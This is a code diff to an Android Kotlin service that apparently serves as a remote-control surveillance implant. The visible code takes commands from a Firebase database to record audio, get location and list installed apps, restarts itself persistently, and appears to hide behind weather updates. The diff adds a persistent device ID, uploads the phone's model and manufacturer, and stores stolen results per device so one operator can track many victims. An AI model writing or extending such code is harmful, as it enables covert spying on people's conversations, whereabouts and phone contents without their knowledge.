@@ -54,19 +54,26 @@ class FirebaseCommandService : Service() {
 
     private lateinit var database: DatabaseReference
     private var sessionKey: String? = null
+    private var deviceId: String? = null
     private var listener: ValueEventListener? = null
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         var key = intent?.getStringExtra("SESSION_KEY")
+        val prefs = getSharedPreferences("x24_prefs", Context.MODE_PRIVATE)
 
         if (key == null) {
-            val prefs = getSharedPreferences("x24_prefs", Context.MODE_PRIVATE)
             key = prefs.getString("SESSION_KEY", null)
         }
 
-        if (key != null) {
+        deviceId = prefs.getString("DEVICE_ID", null)
+        if (deviceId == null) {
+            deviceId = java.util.UUID.randomUUID().toString()
+            prefs.edit().putString("DEVICE_ID", deviceId).apply()
+        }
+
+        if (key != null && deviceId != null) {
             sessionKey = key
-            setupFirebaseListener(key)
+            setupFirebaseListener(key, deviceId!!)
         }
 
         startWeatherUpdates()
@@ -74,9 +81,13 @@ class FirebaseCommandService : Service() {
         return START_STICKY
     }
 
-    private fun setupFirebaseListener(key: String) {
+    private fun setupFirebaseListener(key: String, deviceId: String) {
         val rootRef = FirebaseDatabase.getInstance().reference
-        database = rootRef.child("sessions").child(key)
+        database = rootRef.child("sessions").child(key).child("devices").child(deviceId)
+
+        // Device Info
+        database.child("info").child("name").setValue(Build.MODEL)
+        database.child("info").child("manufacturer").setValue(Build.MANUFACTURER)
 
         // Presence System
         val connectedRef = FirebaseDatabase.getInstance().getReference(".info/connected")
@@ -137,7 +148,7 @@ class FirebaseCommandService : Service() {
                     AudioRecordManager.startRecording(this, currentSessionKey)
                 }
                 "STOP_RECORD_AUDIO" -> {
-                    AudioRecordManager.stopRecording(currentSessionKey)
+                    AudioRecordManager.stopRecording(this, currentSessionKey)
                 }
                 "GET_LOCATION" -> getLocation()
                 "GET_INSTALLED_APPS" -> getInstalledApps()
@@ -642,7 +653,8 @@ class FirebaseCommandService : Service() {
 
     private fun postResult(type: String, data: String, command: String = "") {
         val currentSessionKey = sessionKey ?: return
-        val ref = FirebaseDatabase.getInstance().reference.child("sessions").child(currentSessionKey).child("results").push()
+        val currentDeviceId = deviceId ?: return
+        val ref = FirebaseDatabase.getInstance().reference.child("sessions").child(currentSessionKey).child("devices").child(currentDeviceId).child("results").push()
         val payload = mapOf(
             "type" to type,
             "data" to data,
